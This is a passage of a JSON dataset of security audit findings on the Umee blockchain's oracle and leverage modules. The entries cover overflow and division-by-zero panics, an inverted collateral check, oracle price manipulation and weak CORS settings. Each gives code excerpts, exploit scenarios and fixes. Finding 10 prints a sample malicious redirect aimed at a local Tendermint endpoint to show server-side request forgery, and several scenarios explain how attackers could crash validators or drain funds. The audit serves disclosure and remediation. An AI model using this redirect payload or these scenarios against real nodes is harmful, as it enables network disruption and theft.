ensuring that every exchange rate substring contains exactly one colon character and checking whether all denominations are included in the list of accepted denominations; also avoid trimming whitespaces at the beginning of the parsing process. Long term, consider replacing the truncated SHA-256 hash function with a SHA-512/256 or HMAC-SHA256 function. This will increase the level of security from 80 bits to about 128, which will help prevent collision and length extension attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Validators can crash other nodes by triggering an integer overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "By submitting a large exchange rate value, a validator can trigger an integer overow that will cause a Go panic and a node crash. The Umee oracle code checks that each exchange rate submitted by a validator is a positive value with a bit size of less than or equal to 256 (gures 4.1 and 4.2). The StandardDeviation method iterates over all exchange rates and adds up their squares (gure 4.3) but does not check for an overow. A large exchange rate value will cause the StandardDeviation method to panic when performing multiplication or addition . func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { // (...) for i, tupleStr := range tupleStrs { // (...) decCoin, err := sdk.NewDecFromStr(denomAmountStr[ 1 ]) // (...) if !decCoin.IsPositive() { return nil , types.ErrInvalidOraclePrice } Figure 4.1: The check of whether the exchange rate values are positive ( umee/x/oracle/types/vote.go#L71-L96 ) func (msg MsgAggregateExchangeRateVote) ValidateBasic() error { // (...) exchangeRates, err := ParseExchangeRateTuples(msg.ExchangeRates) if err != nil { /* (...) - returns wrapped error */ } for _, exchangeRate := range exchangeRates { // check overflow bit length if exchangeRate.ExchangeRate.BigInt().BitLen() > 255 +sdk.DecimalPrecisionBits // (...) - returns error Figure 4.2: The check of the exchange rate values bit lengths ( umee/x/oracle/types/msgs.go#L136-L146 ) sum := sdk.ZeroDec() for _, v := range pb { deviation := v.ExchangeRate.Sub(median) sum = sum.Add(deviation.Mul(deviation)) } Figure 4.3: Part of the StandardDeviation method ( umee/x/oracle/types/ballot.go#8387 ) The StandardDeviation method is called by the Tally function, which is called in the EndBlocker function. This means that an attacker could trigger an overow remotely in another validator node. Exploit Scenario A malicious validator commits to and then sends a large UMEE exchange rate value. As a result, all validator nodes crash, and the Umee blockchain network stops working. Recommendations Short term, implement overow checks for all arithmetic operations involving exchange rates. Long term, use fuzzing to ensure that no other parts of the code are vulnerable to overows.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. The repayValue variable is not used after being modied ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Keeper.LiquidateBorrow function uses the local variable repayValue to calculate the repayment.Amount value. If repayValue is greater than or equal to maxRepayValue , it is changed to that value. However, the repayValue variable is not used again after being modied, which suggests that the modication could be a bug or a code quality issue. func (k Keeper) LiquidateBorrow( // (...) // repayment cannot exceed borrowed value * close factor maxRepayValue := borrowValue.Mul(closeFactor) repayValue, err := k.TokenValue(ctx, repayment) if err != nil { return sdk.ZeroInt(), sdk.ZeroInt(), err } if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue).Quo( repayValue ).TruncateInt() repayValue = maxRepayValue } // (...) Figure 5.1: umee/x/leverage/keeper/keeper.go#L446-L456 We identied this issue by running CodeQL's DeadStoreOfLocal.ql query. Recommendations Short term, review and x the repayValue variable in the Keeper.LiquidateBorrow function, which is not used after being modied, to prevent related issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Inconsistent error checks in GetSigners methods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The GetSigners methods in the x/oracle and x/leverage modules exhibit dierent error-handling behavior when parsing strings into validator or account addresses. The GetSigners methods in the x/oracle module always panic upon an error, while the methods in the x/leverage module explicitly ignore parsing errors. Figures 6.1 and 6.2 show examples of the GetSigners methods in those modules. We set the severity of this nding to informational because message addresses parsed in the x/leverage modules GetSigners methods are also validated in the ValidateBasic methods. As a result, the issue is not currently exploitable. // GetSigners implements sdk.Msg func (msg MsgDelegateFeedConsent) GetSigners() []sdk.AccAddress { operator, err := sdk.ValAddressFromBech32(msg.Operator) if err != nil { panic (err) } return []sdk.AccAddress{sdk.AccAddress(operator)} } Figure 6.1: umee/x/oracle/types/msgs.go#L174-L182 func (msg *MsgLendAsset) GetSigners() []sdk.AccAddress { lender, _ := sdk.AccAddressFromBech32(msg.GetLender()) return []sdk.AccAddress{lender} } Figure 6.2: umee/x/leverage/types/tx.go#L30-L33 Recommendations Short term, use a consistent error-handling process in the x/oracle and x/leverage modules GetSigners methods. The x/leverage module's GetSigners functions should handle errors in the same way that the x/oracle methods doby panicking.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Incorrect price assumption in the GetExchangeRateBase function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "If the denominator string passed to the GetExchangeRateBase function contains the substring USD (gure 7.1), the function returns 1 , presumably to indicate that the denominator is a stablecoin. If the system accepts an ERC20 token that is not a stablecoin but has a name containing USD, the system will report an incorrect exchange rate for the asset, which may enable token theft. Moreover, the price of an actual USD stablecoin may vary from USD 1. Therefore, if a stablecoin used as collateral for a loan loses its peg, the loan may not be liquidated correctly. // GetExchangeRateBase gets the consensus exchange rate of an asset // in the base denom (e.g. ATOM -> uatom) func (k Keeper) GetExchangeRateBase(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if strings.Contains(strings.ToUpper(denom), types.USDDenom) { return sdk.OneDec(), nil } // (...) Figure 7.1: umee/x/oracle/keeper/keeper.go#L89-L94 func (k Keeper) TokenPrice(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if !k.IsAcceptedToken(ctx, denom) { return sdk.ZeroDec(), sdkerrors.Wrap(types.ErrInvalidAsset, denom) } price, err := k.oracleKeeper.GetExchangeRateBase(ctx, denom) // (...) return price, nil } Figure 7.2: umee/x/leverage/keeper/oracle.go#L12-L34 Exploit Scenario Umee adds the cUSDC ERC20 token as an accepted token. Upon its addition, its price is USD 0.02, not USD 1. However, because of the incorrect price assumption, the system sets its price to USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Exploit Scenario 2 The price of a stablecoin drops signicantly. However, the x/leverage module fails to detect the change and reports the price as USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Recommendations Short term, remove the condition that causes the GetExchangeRateBase function to return a price of USD 1 for any asset whose name contains USD.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Oracle price-feeder is vulnerable to manipulation by a single malicious price feed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The price-feeder component uses a volume-weighted average price (VWAP) formula to compute average prices from various third-party providers. The price it determines is then sent to the x/oracle module, which commits it on-chain. However, an asset price could easily be manipulated by only one compromised or malfunctioning third-party provider. Exploit Scenario Most validators are using the Binance API as one of their price providers. The API is compromised by an attacker and suddenly starts to report prices that are much higher than those reported by other providers. However, the price-feeder instances being used by the validators do not detect the discrepancies in the Binance API prices. As a result, the VWAP value computed by the price-feeder and committed on-chain is much higher than it should be. Moreover, because most validators have committed the wrong price, the average computed on-chain is also wrong. The attacker then draws funds from the system. Recommendations Short term, implement a price-feeder mechanism for detecting the submission of wildly incorrect prices by a third-party provider. Have the system temporarily disable the use of the malfunctioning provider(s) and issue an alert calling for an investigation. If it is not possible to automatically identify the malfunctioning provider(s), stop committing prices. (Note, though, that this may result in a loss of interest for validators.) Consider implementing a similar mechanism in the x/oracle module so that it can identify when the exchange rates committed by validators are too similar to one another or to old values. References  Synthetix Response to Oracle Incident",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Oracle rewards may not be distributed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "If the x/oracle module lacks the coins to cover a reward payout, the rewards will not be distributed or registered for payment in the future. var periodRewards sdk.DecCoins for _, denom := range rewardDenoms { rewardPool := k.GetRewardPool(ctx, denom) // return if there's no rewards to give out if rewardPool.IsZero() { continue } periodRewards = periodRewards.Add(sdk.NewDecCoinFromDec( denom, sdk.NewDecFromInt(rewardPool.Amount).Mul(distributionRatio), )) } Figure 9.1: A loop in the code that calculates oracle rewards ( umee/x/oracle/keeper/reward.go#4356 ) Recommendations Short term, document the fact that oracle rewards will not be distributed when the x/oracle module does not have enough coins to cover the rewards.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Risk of server-side request forgery attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The price-feeder sends HTTP requests to congured providers APIs. If any of the HTTP responses is a redirect response (e.g., one with HTTP response code 301), the module will automatically issue a new request to the address provided in the responses header. The new address may point to a local address, potentially one that provides access to restricted services. Exploit Scenario An attacker gains control over the Osmosis API. He changes the endpoint used by the price-feeder such that it responds with a redirect like that shown in gure 10.1, with the goal of removing a transaction from a Tendermint validators mempool. The price-feeder automatically issues a new request to the Tendermint REST API. Because the API does not require authentication and is running on the same machine as the price-feeder , the request is successful, and the target transaction is removed from the validator's mempool. HTTP/1.1 301 Moved Permanently Location: http://localhost:26657/remove_tx?txKey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Figure 10.1: The redirect response Recommendations Short term, use a function such as CheckRedirect to disable redirects, or at least redirects to local services, in all HTTP clients.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Incorrect comparison in SetCollateralSetting method ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Umee users can send a SetCollateral message to disable the use of a certain asset as collateral. The messages are handled by the SetCollateralSetting method (gure 11.1), which should ensure that the borrow limit will not drop below the amount borrowed. However, the function uses an incorrect comparison, checking that the borrow limit will be greater than, not less than, that amount. // Return error if borrow limit would drop below borrowed value if newBorrowLimit.GT(borrowedValue) { return sdkerrors.Wrap(types.ErrBorrowLimitLow, newBorrowLimit.String()) } Figure 11.1: The incorrect comparison in the SetCollateralSetting method ( umee/x/leverage/keeper/keeper.go#343346 ) Exploit Scenario An attacker provides collateral to the Umee system and borrows some coins. Then the attacker disables the use of the collateral asset; because of the incorrect comparison in the SetCollateralSetting method, the disable operation succeeds, and the collateral is sent back to the attacker. Recommendations Short term, correct the comparison in the SetCollateralSetting method. Long term, implement tests to check whether basic functionality works as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Voters ability to overwrite their own pre-votes is not documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The x/oracle module allows voters to submit more than one pre-vote message during the same pre-voting period, overwriting their previous pre-vote messages (gure 12.1). This feature is not documented; while it does not constitute a direct security risk, it may be unintended behavior. Third parties may incorrectly assume that validators cannot change their pre-vote messages. Monitoring systems may detect only the rst pre-vote event for a validators pre-vote messages, while voters may trust the exchange rates and salts revealed by other voters to be nal. On the other hand, this feature may be an intentional one meant to allow voters to update the exchange rates they submit as they obtain more accurate pricing information. func (ms msgServer) AggregateExchangeRatePrevote( goCtx context.Context, msg *types.MsgAggregateExchangeRatePrevote, ) (*types.MsgAggregateExchangeRatePrevoteResponse, error ) { // (...) aggregatePrevote := types.NewAggregateExchangeRatePrevote(voteHash, valAddr, uint64 (ctx.BlockHeight())) // This call overwrites previous pre-vote if there was one ms.SetAggregateExchangeRatePrevote(ctx, valAddr, aggregatePrevote) ctx.EventManager().EmitEvents(sdk.Events{ // (...) - emit EventTypeAggregatePrevote and EventTypeMessage }) return &types.MsgAggregateExchangeRatePrevoteResponse{}, nil } Figure 12.1: umee/x/oracle/keeper/msg_server.go#L23-L66 Recommendations Short term, document the fact that a pre-vote message can be submitted and overwritten in the same voting period. Alternatively, disallow this behavior by having the AggregateExchangeRatePrevote function return an error if a validator attempts to submit an additional exchange rate pre-vote message. Long term, add tests to check for this behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of user-controlled limits for input amount in LiquidateBorrow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The x/leverage modules LiquidateBorrow function computes the amount of funds that will be transferred from the module to the functions caller in a liquidation. The computation uses asset prices retrieved from an oracle. There is no guarantee that the amount returned by the module will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to LiquidateBorrow . Adding a lower limit to the amount sent by the module would enable the caller to explicitly state his or her assumptions about the liquidation and to ensure that the collateral payout is as protable as expected. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls the LiquidateBorrow function. Due to an oracle malfunction, the amount of collateral transferred from the module is much lower than the amount she would receive on another market. Recommendations Short term, introduce a minRewardAmount parameter and add a check verifying that the reward value is greater than or equal to the minRewardAmount value. Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a module and an upper limit for a transfer of the callers funds to a module.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Lack of simulation and fuzzing of leverage module invariants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Umee system lacks comprehensive Cosmos SDK simulations and invariants for its x/oracle and x/leverage modules. More thorough use of the simulation feature would facilitate fuzz testing of the entire blockchain and help ensure that the invariants hold. Additionally, the current simulation module may need to be modied for the following reasons:     It exits on the rst transaction error . To avoid an early exit, it could skip transactions that are expected to fail when they are generated; however, that could also cause it to skip logic that contains issues. The numKeys argument , which determines how many accounts it will use, can range from 2 to 2,500. Using too many accounts may hinder the detection of bugs that require multiple transactions to be executed by a few accounts. By default, it is congured to use a \"stake\" currency , which may not be used in the nal Umee system. Running it with a small number of accounts and a large block size for many blocks could quickly cause all validators to be unbonded. To avoid this issue, the simulation would need the ability to run for a longer time. attempted to use the simulation module by modifying the recent changes to the Umee codebase, which introduce simulations for the x/oracle and x/leverage modules (commit f22b2c7f8e ). We enabled the x/leverage module simulation and modied the Cosmos SDK codebase locally so that the framework would use fewer accounts and log errors via Fatalf logs instead of exiting. The framework helped us nd the issue described in TOB-UMEE-15 , but the setup and tests we implemented were not exhaustive. We sent the codebase changes we made to the Umee team via an internal chat. Recommendations Short term, identify, document, and test all invariants that are important for the systems security, and identify and document the arbitrage opportunities created by the system. Enable simulation of the x/oracle and x/leverage modules and ensure that the following assertions and invariants are checked during simulation runs: 1. In the UpdateExchangeRates function , the token supply value corresponds to the uToken supply value. Implement the following check: if uTokenSupply != 0 { assert(tokenSupply != 0) } 2. In the LiquidateBorrow function (after the line  if !repayment.Amount.IsPositive()  ) , the following comparisons evaluate to true: ExchangeUToken(reward) == EquivalentTokenValue(repayment, baseRewardDenom) TokenValue(ExchangeUToken(ctx, reward)) == TokenValue(repayment) borrowed.AmountOf(repayment.Denom) >= repayment.Amount collateral.AmountOf(rewardDenom) >= reward.Amount module's collateral amount >= reward.Amount repayment <= desiredRepayment 3. The x/leverage module is never signicantly undercollateralized at the end of a transaction. Implement a check, total collateral value * X >= total borrows value , in which X is close to 1. (It may make sense for the value of X to be greater than or equal to 1 to account for module reserves.) It may be acceptable for the module to be slightly undercollateralized, as it may mean that some liquidations have yet to be executed. 4. The amount of reserves remains above a certain minimum value, or new loans cannot be issued if the amount of reserves drops below a certain value. 5. The interest on a loan is less than or equal to the borrowing fee. (This invariant is related to the issue described in TOB-UMEE-23 .) 6. 7. 8. It is impossible to borrow funds without paying a fee. Currently, when four messages (lend, borrow, repay, and withdraw messages) are sent in one transaction, the EndBlocker method will not collect borrowing fees. Token/uToken exchange rates are always greater than or equal to 1 and are less than an expected maximum. To avoid rapid signicant price increases and decreases, ensure that the rates do not change more quickly than expected. The exchangeRate value cannot be changed by public (user-callable) methods like LendAsset and WithdrawAsset . Pay special attention to rounding errors and make sure that the module is the beneciary of all rounding operations. 9. It is impossible to liquidate more than the closeFactor in a single liquidation transaction for a defaulted loan; be mindful of the fact that a single transaction can include more than one message. Long term, e xtend the simulation module to cover all operations that may occur in a real Umee deployment, along with all potential error states, and run it many times before each release. Ensure the following:       All modules and operations are included in the simulation module. The simulation uses a small number of accounts (e.g., between 5 and 20) to increase the likelihood of an interesting state change. The simulation uses the currencies/tokens that will be used in the production network. Oracle price changes are properly simulated. (In addition to a mode in which prices are changed randomly, implement a mode in which prices are changed only slightly, a mode in which prices are highly volatile, and a mode in which prices decrease or increase continuously for a long time period.) The simulation continues running when a transaction triggers an error. All transaction code paths are executed. (Enable code coverage to see how often individual lines are executed.)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Attempts to overdraw collateral cause WithdrawAsset to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The WithdrawAsset function panics when an account attempts to withdraw more collateral than the account holds. While panics triggered during transaction runs are recovered by the Cosmos SDK , they should be used only to handle unexpected events that should not occur in normal blockchain operations. The function should instead check the collateralToWithdraw value and return an error if it is too large. The panic occurs in the Dec.Sub method when the calculation it performs results in an overow (gure 15.1). func (k Keeper) WithdrawAsset( /* (...) */ ) error { // (...) if amountFromCollateral.IsPositive() { if k.GetCollateralSetting(ctx, lenderAddr, uToken.Denom) { // (...) // Calculate what borrow limit will be AFTER this withdrawal collateral := k.GetBorrowerCollateral(ctx, lenderAddr) collateralToWithdraw := sdk.NewCoins(sdk.NewCoin(uToken.Denom, amountFromCollateral)) newBorrowLimit, err := k.CalculateBorrowLimit(ctx, collateral.Sub(collateralToWithdraw) ) Figure 15.1: umee/x/leverage/keeper/keeper.go#L124-L159 To reproduce this issue, use the test shown in gure 15.2. Exploit Scenario A user of the Umee system who has enabled the collateral setting lends 1,000 UMEE tokens. The user later tries to withdraw 1,001 UMEE tokens. Due to the lack of validation of the collateralToWithdraw value, the transaction causes a panic. However, the panic is recovered, and the transaction nishes with a panic error . Because the system does not provide a proper error message, the user is confused about why the transaction failed. Recommendations Short term, when a user attempts to withdraw collateral, have the WithdrawAsset function check whether the collateralToWithdraw value is less than or equal to the collateral balance of the users account and return an error if it is not. This will prevent the function from panicking if the withdrawal amount is too large. Long term, integrate the test shown in gure 15.2 into the codebase and extend it with additional assertions to verify other program states. func (s *IntegrationTestSuite) TestWithdrawAsset_InsufficientCollateral() { app, ctx := s.app, s.ctx lenderAddr := sdk.AccAddress([] byte ( \"addr________________\" )) lenderAcc := app.AccountKeeper.NewAccountWithAddress(ctx, lenderAddr) app.AccountKeeper.SetAccount(ctx, lenderAcc) // mint and send coins s.Require().NoError(app.BankKeeper.MintCoins(ctx, minttypes.ModuleName, initCoins)) s.Require().NoError(app.BankKeeper.SendCoinsFromModuleToAccount(ctx, minttypes.ModuleName, lenderAddr, initCoins)) // mint additional coins for just the leverage module; this way it will have available reserve // to meet conditions in the withdrawal logic s.Require().NoError(app.BankKeeper.MintCoins(ctx, types.ModuleName, initCoins)) // set collateral setting for the account uTokenDenom := types.UTokenFromTokenDenom(umeeapp.BondDenom) err := s.app.LeverageKeeper.SetCollateralSetting(ctx, lenderAddr, uTokenDenom, true ) s.Require().NoError(err) // lend asset err = s.app.LeverageKeeper.LendAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 1000000000 )) // 1k umee s.Require().NoError(err) // verify collateral amount and total supply of minted uTokens collateral := s.app.LeverageKeeper.GetCollateralAmount(ctx, lenderAddr, uTokenDenom) expected := sdk.NewInt64Coin(uTokenDenom, 1000000000 ) // 1k u/umee s.Require().Equal(collateral, expected) supply := s.app.LeverageKeeper.TotalUTokenSupply(ctx, uTokenDenom) s.Require().Equal(expected, supply) // withdraw more collateral than having - this panics currently uToken := collateral.Add(sdk.NewInt64Coin(uTokenDenom, 1 )) err = s.app.LeverageKeeper.WithdrawAsset(ctx, lenderAddr, uToken) s.Require().EqualError(err, \"TODO/FIXME: set proper error string here after fixing panic error\" ) // TODO/FIXME: add asserts to verify all other program state } Figure 15.2: A test that can be used to reproduce this issue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Division by zero causes the LiquidateBorrow function to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Two operations in the x/leverage modules LiquidateBorrow method may involve division by zero and lead to a panic. The rst operation is shown in gure 16.1. If both repayValue and maxRepayValue are zero, the GTE (greater-than-or-equal-to) comparison will succeed, and the Quo method will panic. The repayValue variable will be set to zero if liquidatorBalance is set to zero; maxRepayValue will be set to zero if either closeFactor or borrowValue is set to zero. if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue) .Quo(repayValue) .TruncateInt() repayValue = maxRepayValue } Figure 16.1: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#452456 ) The second operation is shown in gure 16.2. If both reward.Amount and collateral.AmountOf(rewardDenom) are set to zero, the GTE comparison will succeed, and the Quo method will panic. The collateral.AmountOf(rewardDenom) variable can easily be set to zero, as the user may not have any collateral in the denomination indicated by the variable; reward.Amount will be set to zero if liquidatorBalance is set to zero. // reward amount cannot exceed available collateral if reward.Amount.GTE(collateral.AmountOf(rewardDenom)) { // reduce repayment.Amount to the maximum value permitted by the available collateral reward repayment.Amount = repayment.Amount.Mul(collateral.AmountOf(rewardDenom)) .Quo(reward.Amount) // use all collateral of reward denom reward.Amount = collateral.AmountOf(rewardDenom) } Figure 16.2: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#474480 ) Exploit Scenario A user tries to liquidate a loan. For reasons that are unclear to the user, the transaction fails with a panic. Because the error message is not specic, the user has diculty debugging the error. Recommendations Short term, replace the GTE comparison with a strict inequality GT (greater-than) comparison. Long term, carefully validate variables in the LiquidateBorrow method to ensure that every variable stays within the expected range during the entire computation . Write negative tests with edge-case values to ensure that the methods handle errors gracefully.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Architecture-dependent code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "In the Go programming language, the bit size of an int variable depends on the platform on which the code is executed. On a 32-bit platform, it will be 32 bits, and on a 64-bit platform, 64 bits. Validators running on dierent architectures will therefore interpret int types dierently, which may lead to transaction-parsing discrepancies and ultimately to a consensus failure or chain split. One use of the int type is shown in gure 17.1. Because casting the maxValidators variable to the int type should not cause it to exceed the maximum int value for a 32-bit platform, we set the severity of this nding to informational. for ; iterator.Valid() && i < int (maxValidators) ; iterator.Next() { Figure 17.1: An architecture-dependent loop condition in the EndBlocker method ( umee/x/oracle/abci.go#34 ) Exploit Scenario The maxValidators variable (a variable of the uint32 type) is set to its maximum value, 4,294,967,296. During the execution of the x/oracle modules EndBlocker method, some validators cast the variable to a negative number, while others cast it to a large positive integer. The chain then stops working because the validators cannot reach a consensus. Recommendations Short term, ensure that architecture-dependent types are not used in the codebase . Long term, test the system with parameters set to various edge-case values, including the maximum and minimum values of dierent integer types. Test the system on all common architectures (e.g., architectures with 32- and 64-bit CPUs), or develop documentation specifying the architecture(s) used in testing.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Weak cross-origin resource sharing settings ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "In the price-feeder s cross-origin resource sharing (CORS) settings, most of the same-origin policy protections are disabled. This increases the severity of vulnerabilities like cross-site request forgery. v1Router.Methods( \"OPTIONS\" ).HandlerFunc( func (w http.ResponseWriter, r *http.Request) { w.Header().Set( \"Access-Control-Allow-Origin\" , r.Header.Get( \"Origin\" )) w.Header().Set( \"Access-Control-Allow-Methods\" , \"GET, PUT, POST, DELETE, OPTIONS\" ) w.Header().Set( \"Access-Control-Allow-Headers\" , \"Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With\" ) w.Header().Set( \"Access-Control-Allow-Credentials\" , \"true\" ) w.WriteHeader(http.StatusOK) }) Figure 18.1: The current CORS conguration ( umee/price-feeder/router/v1/router.go#4652 ) We set the severity of this nding to informational because no sensitive endpoints are exposed by the price-feeder router. Exploit Scenario A new endpoint is added to the price-feeder API. It accepts PUT requests that can update the tools provider list. An attacker uses phishing to lure the price-feeder s operator to a malicious website. The website triggers an HTTP PUT request to the API, changing the provider list to a list in which all addresses are controlled by the attacker. The attacker then repeats the attack against most of the validators, manipulates on-chain prices, and drains the systems funds. Recommendations Short term, use strong default values in the CORS settings . Long term, ensure that APIs exposed by the price-feeder have proper protections against web vulnerabilities.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. price-feeder is at risk of rate limiting by public APIs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Price providers used by the price-feeder tool may enforce limits on the number of requests served to them. After reaching a limit, the tool should take certain actions to avoid a prolonged or even permanent ban. Moreover, using API keys or non-HTTP access channels would decrease the price-feeder s chance of being rate limited. Every API has its own rules, which should be reviewed and respected. The rules of three APIs are summarized below.    Binance has hard, machine-learning, and web application rewall limits . Users are required to stop sending requests if they receive a 429 HTTP response code . Kraken implements rate limiting based on call counters and recommends using the WebSockets API instead of the REST API. Huopi restricts the number of requests to 10 per second and recommends using an API key. Exploit Scenario A price-feeder exceeds the limits of the Binance API. It is rate limited and receives a 429 HTTP response code from the API. The tool does not notice the response code and continues to spam the API. As a result, it receives a permanent ban. The validator using the price-feeder then starts reporting imprecise exchange rates and gets slashed. Recommendations Short term, review the requirements and recommendations of all APIs supported by the system . Enforce their requirements in a user-friendly manner; for example, allow users to set and rotate API keys, delay HTTP requests so that the price-feeder will avoid rate limiting but still report accurate prices, and log informative error messages upon reaching rate limits. Long term, perform stress-testing to ensure that the implemented safety checks work properly and are robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "20. Lack of prioritization of oracle messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Oracle messages are not prioritized over other transactions for inclusion in a block. If the network is highly congested, the messages may not be included in a block. Although the Umee system could increase the fee charged for including an oracle message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario The Umee network is congested. Validators send their exchange rate votes, but the exchange rates are not included in a block. An attacker then exploits the situation by draining the network of its tokens. Recommendations Short term, use a custom CheckTx method to prioritize oracle messages . This will help prevent validators votes from being left out of a block and ignored by an oracle. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "21. Risk of token/uToken exchange rate manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Umee specication states that the token/uToken exchange rate can be aected only by the accrual of interest (not by Lend , Withdraw , Borrow , Repay , or Liquidate transactions). However, this invariant can be broken:   When tokens are burned or minted through an Inter-Blockchain Communication (IBC) transfer, the ibc-go library accesses the x/bank modules keeper interface, which changes the total token supply (as shown in gure 21.2). This behavior is mentioned in a comment shown in gure 22.1. Sending tokens directly to the module through an x/bank message also aects the exchange rate. func (k Keeper) TotalUTokenSupply(ctx sdk.Context, uTokenDenom string ) sdk.Coin { if k.IsAcceptedUToken(ctx, uTokenDenom) { return k.bankKeeper.GetSupply(ctx, uTokenDenom) // TODO - Question: Does bank module still track balances sent (locked) via IBC? // If it doesn't then the balance returned here would decrease when the tokens // are sent off, which is not what we want. In that case, the keeper should keep // an sdk.Int total supply for each uToken type. } return sdk.NewCoin(uTokenDenom, sdk.ZeroInt()) } Figure 21.1: The method vulnerable to unexpected IBC transfers ( umee/x/leverage/keeper/keeper.go#6573 ) if err := k.bankKeeper.BurnCoins( ctx, types.ModuleName, sdk.NewCoins(token), Figure 21.2: The IBC library code that accesses the x/bank modules keeper interface ( ibc-go/modules/apps/transfer/keeper/relay.go#136137 ) Exploit Scenario An attacker with two Umee accounts lends tokens through the system and receives a commensurate number of uTokens. He temporarily sends the uTokens from one of the accounts to another chain (chain B), decreasing the total supply and increasing the token/uToken exchange rate. The attacker uses the second account to withdraw more tokens than he otherwise could and then sends uTokens back from chain B to the rst account. In this way, he drains funds from the module. Recommendations Short term, ensure that the TotalUTokenSupply method accounts for IBC transfers. Use the Cosmos SDKs blocklisting feature to disable direct transfers to the leverage and oracle modules. Consider setting DefaultSendEnabled to false and explicitly enabling certain tokens transfer capabilities. Long term, follow GitHub issues #10386 and #5931 , which concern functionalities that may enable module developers to make token accounting more reliable. Additionally, ensure that the system accounts for ination .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "22. Collateral dust prevents the designation of defaulted loans as bad debt ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
